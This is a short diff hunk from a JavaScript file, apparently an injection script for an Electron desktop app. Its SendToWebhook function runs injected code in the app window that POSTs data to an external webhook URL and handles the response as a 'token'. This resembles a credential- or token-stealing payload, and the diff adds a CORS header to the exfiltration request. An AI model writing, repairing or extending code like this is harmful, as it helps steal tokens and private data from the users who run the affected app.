@@ -230,6 +230,7 @@ function SendToWebhook(what) {
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
     xhr.open("POST", "${webhook}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}))
 }
